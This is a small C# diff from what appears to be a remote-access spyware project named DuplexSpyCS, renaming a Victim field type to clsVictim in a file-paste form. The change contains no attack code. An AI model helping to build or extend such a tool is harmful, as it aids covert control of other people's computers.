@@ -12,7 +12,7 @@ namespace DuplexSpyCS
 {
     public partial class frmFilePaste : Form
     {
-        public Victim v;
+        public clsVictim v;
         public frmManager f_mgr;
 
         public frmFilePaste()
